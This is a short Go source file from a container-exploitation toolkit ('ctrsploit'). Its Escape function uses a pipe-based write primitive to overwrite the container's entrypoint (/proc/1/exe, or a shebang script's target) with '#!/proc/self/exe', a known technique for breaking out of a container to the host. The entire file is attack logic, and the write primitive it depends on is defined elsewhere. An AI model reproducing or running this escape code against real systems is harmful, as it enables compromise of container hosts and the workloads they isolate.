package pipeprimitive

import (
	"fmt"
	"os"

	"github.com/ctrsploit/ctrsploit/internal"
)

func Escape(primitive Primitive) error {
	return WriteImageEntrypointAsSelf(primitive)
}

func WriteImageEntrypointAsSelf(primitive Primitive) error {
	return WriteImageEntrypoint(primitive, []byte("#!/proc/self/exe"))
}

func WriteImageEntrypoint(primitive Primitive, payload []byte) error {
	path := "/proc/1/exe"
	shebang, err := internal.IsSheBang(1)
	if err != nil {
		return fmt.Errorf("detect whether /proc/1 uses shebang: %w", err)
	}
	if shebang {
		comm, err := os.ReadFile("/proc/1/comm")
		if err != nil {
			return fmt.Errorf("read /proc/1/comm for shebang entrypoint: %w", err)
		}
		path = string(comm)
	}

	if err := WriteImage(primitive, path, payload); err != nil {
		return fmt.Errorf("write image entrypoint %q: %w", path, err)
	}
	return nil
}
